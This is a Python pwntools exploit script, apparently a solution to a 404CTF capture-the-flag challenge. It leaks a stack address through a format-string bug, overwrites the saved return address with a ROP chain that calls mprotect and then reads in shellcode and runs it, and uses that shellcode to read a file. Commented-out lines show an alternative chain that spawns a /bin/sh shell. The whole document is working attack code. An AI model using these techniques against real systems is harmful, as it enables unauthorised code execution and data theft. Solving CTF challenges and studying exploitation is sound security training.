#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('une_citation_pas_comme_les_autres_1_2')

host = args.HOST or 'challenges.404ctf.fr'
port = int(args.PORT or 31719)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
b *write_quote+207
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

####################
# Step 1: leak stack
####################
io.sendlineafter(b'>>> ',b'2')
io.sendlineafter(b'[Vous] : ',b'%p')

io.recvuntil(b'crire : ')
leak = int(io.recvline(),16)
saved_rip = leak + 0x5a8

log.success(f'{leak = :x} {saved_rip = :x}')

########################
# Step 2: write ropchain
########################

# syscall execve('/bin/sh', 0, 0) 
rop = ROP(exe)
# rop.rax = 59
# rop.rsi = 0
# rop.rdx = 0
# rop.rdi = saved_rip + 0X50
# rop.raw(0x000000000040145f)
# rop.raw(b'/bin/sh\0')

WRITABLE = 0x4bc000
# mprotect
rop.rax = 10
rop.rdi = WRITABLE
rop.rsi = 0X1000
rop.rdx = 7
rop.raw(0x000000000041a206) # syscall ; ret

# read(0, bss, 0x1000)
# call bss
rop.rax = 0
rop.rdi = 0
rop.rsi = WRITABLE
rop.rdx = 0x1000
rop.raw(0x000000000041a206) # syscall ; ret
rop.rax = WRITABLE
rop.raw(0x0000000000401014) # call rax

print(rop.dump())
ropchain = rop.chain()

fmt = fmtstr_payload(6, {saved_rip: ropchain}, write_size='short')

print(fmt)
print(len(fmt))

io.sendlineafter(b'>>> ',b'2')
io.sendlineafter(b'[Vous] : ',fmt)

# sh = shellcraft.open('.')
# sh += shellcraft.getdents('rax','rsp', 0x500)
# sh += shellcraft.write(1,'rsp', 0X500)
sh = shellcraft.cat('citations.txt')

io.sendline(asm(sh))

io.recvuntil(b'davantage.\n')

data = io.recvall()

print(data)

print(dirents(data))

io.interactive()

